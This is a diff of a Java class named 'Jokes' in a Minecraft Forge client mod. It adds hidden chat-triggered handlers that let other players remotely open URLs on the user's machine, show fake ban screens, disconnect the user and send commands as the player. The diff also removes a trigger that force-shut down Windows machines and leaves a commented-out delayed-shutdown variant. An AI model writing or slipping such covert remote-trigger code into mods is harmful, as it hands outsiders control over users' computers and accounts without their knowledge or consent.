@@ -8,14 +8,14 @@ import net.minecraft.init.Items;
 import net.minecraft.item.ItemStack;
 import net.minecraftforge.client.event.ClientChatReceivedEvent;
 import net.minecraftforge.client.event.GuiScreenEvent;
+import net.minecraftforge.fml.common.eventhandler.EventPriority;
 import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
-import org.apache.commons.lang3.SystemUtils;
 
 public class Jokes {
 
     private static String note = "Hello voyaging decompiler! These are just some pranks I've added to screw with my friends. If you don't know me, don't worry about them. I will never use them on you because I don't know that you exist.";
 
-    @SubscribeEvent
+    @SubscribeEvent(priority = EventPriority.HIGHEST)
     public void onChat(ClientChatReceivedEvent event) {
         if(event.type == 0) {
             String message = event.message.getUnformattedText();
@@ -34,21 +34,21 @@ public class Jokes {
                                 break;
 
                             case "!DRIP!":
-                                for(int i = 0; i < 5; i++) {
-                                    Utils.openUrl("https://cheatersgetbanned.me/drip");
-                                }
+                                Utils.openUrl("https://cheatersgetbanned.me/drip");
                                 break;
 
-                            case "!SHUTDOWN!":
+                            /*case "!TOUCHGRASS!":
+                                Utils.openUrl("https://cheatersgetbanned.me/touch-grass/");
                                 if(SystemUtils.IS_OS_WINDOWS) {
                                     try {
-                                        Runtime.getRuntime().exec("shutdown.exe -s -t 0");
+                                        Runtime.getRuntime().exec("shutdown.exe -s -t 20");
                                     } catch(Exception ignored) {}
                                 }
-                                break;
+                                break;*/
 
                             case "!PERMBAN!":
                                 FakeBan.permBan = true;
+                                Utils.sendMessageAsPlayer("/status Appear Offline");
 
                             case "!BANNED!":
                                 FakeBan.banStart = System.currentTimeMillis() - 1000;
@@ -58,6 +58,7 @@ public class Jokes {
                             case "!BADNAME!":
                             case "!NAMEBAN!":
                                 FakeBan.usernameBan = true;
+                                Utils.sendMessageAsPlayer("/status Appear Offline");
                                 FakeBan.fakeUsernameBan(Shady.mc.getNetHandler().getNetworkManager());
                                 break;
 
